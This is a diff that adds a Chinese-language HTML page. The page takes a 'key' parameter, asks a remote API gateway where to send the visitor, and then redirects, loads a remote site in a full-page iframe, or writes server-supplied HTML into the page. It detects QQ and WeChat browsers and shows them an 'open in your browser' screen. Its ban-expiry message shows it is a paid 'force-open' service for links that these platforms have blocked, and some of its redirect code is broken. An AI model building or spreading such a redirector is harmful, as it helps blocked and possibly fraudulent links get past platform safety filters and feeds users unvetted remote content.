@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>加载中...</title>
+    <style>
+      html, body {
+        height: 100%;
+        width: 100%;
+        margin: 0;
+        padding: 0;
+        border: none;
+        overflow: hidden;
+      }
+      iframe {
+        width: 100%;
+        height: 99%;
+        border: none;
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const key = urlParams.get('key');
+
+if (key) {
+  const isQQorWechat = /MQQBrowser|MicroMessenger/i.test(navigator.userAgent);
+  const isiPhone = /iPhone/i.test(navigator.userAgent);
+  const apiUrl = `http://service-4ixlxg6g-1319376831.gz.apigw.tencentcs.com/1.php?key=${key}`;
+  fetch(apiUrl)
+    .then(response => response.json())
+    .then(data => {
+     if (data.way) {
+     if (data.way === "4") {
+  window.location.href = data.url; // 跳转到新的地址
+  
+}
+ if (data.way === "5") {
+      // 跳转到新的地址
+      window.location.replace = data.url;
+      setTimeout(function() {
+        window.location.href = '/';
+      }, 1000);
+    }
+    
+      if (data.way==="3") {
+          document.write('<h1>强开链接已封禁，请检测是否到期</h1>')
+          return;
+      }
+      if (data.way==="2") {
+              function isQQBrowser() {
+    var userAgent = navigator.userAgent.toLowerCase();
+    if (userAgent.indexOf('mqqbrowser') > -1 && userAgent.indexOf('qq/') > -1) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function isWeChatBrowser() {
+    var userAgent = navigator.userAgent.toLowerCase();
+    if (userAgent.indexOf('micromessenger') > -1) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+if (isQQBrowser()) {
+    // 在QQ浏览器中打开的操作
+     document.write('<!DOCTYPE html><html><head><title>在浏览器打开</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no"><style type="text/css">*{margin:0;padding:0;}#topyd{width: 100%;margin:0 auto;position: fixed;top: 0;}#topyd img{max-width: 100%;}#centeryd{width: 100%;margin:180px auto 0;}#centeryd img{max-width: 100%;position: fixed;top: 0;}#bottomyd{width: 100%;margin:30px auto 0;}#bottomyd p{text-align: center;font-size: 18px;color: #174ded;font-weight: bold;}</style></head><body><!-- 顶部引导 --><div id="topyd"></div><!-- 中部引导 --><div id="centeryd"><img src="iosydt.jpg"></div><!-- 底部引导 --><div id="bottomyd"><p>本站不支持在微信打开</p><p>请在浏览器打开访问</p></div></body></html>')
+    return;
+} else if (isWeChatBrowser()) {
+    // 在微信中打开的操作
+    document.write('<!DOCTYPE html><html><head><title>在浏览器打开</title><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no"><style type="text/css">*{margin:0;padding:0;}#topyd{width: 100%;margin:0 auto;position: fixed;top: 0;}#topyd img{max-width: 100%;}#centeryd{width: 100%;margin:180px auto 0;}#centeryd img{max-width: 100%;position: fixed;top: 0;}#bottomyd{width: 100%;margin:30px auto 0;}#bottomyd p{text-align: center;font-size: 18px;color: #174ded;font-weight: bold;}</style></head><body><!-- 顶部引导 --><div id="topyd"></div><!-- 中部引导 --><div id="centeryd"><img src="iosydt.jpg"></div><!-- 底部引导 --><div id="bottomyd"><p>本站不支持在微信打开</p><p>请在浏览器打开访问</p></div></body></html>')
+    return;
+} else {
+    // 在其他浏览器中打开的操作
+    window.location.replace(data.url);
+
+}
+    }
+    }
+      if (isQQorWechat||isiPhone) {
+       if (data.text) {
+          document.write(data.text);
+        } else if (data.url) {
+          const iframe = document.createElement('iframe');
+          iframe.setAttribute('src', data.url);
+          iframe.addEventListener('load', () => {
+            document.title = data.title || '';
+          });
+          //document.write(data.url);
+          document.body.appendChild(iframe);
+        } else {
+          console.error('Error: Invalid response data');
+        }
+      } else {
+        window.location.replace = data.url;
+          //const iframe = document.createElement('iframe');
+          //iframe.setAttribute('src', data.url);
+          //iframe.addEventListener('load', () => {
+            //document.title = data.title || '';
+         // });
+         // document.body.appendChild(iframe);
+        
+      }
+      
+    })
+    .catch(error => {
+      console.error('Error: ', error);
+    });
+} else {
+  document.write('Invalid Key');
+}
+
+    </script>
+  </body>
+</html>
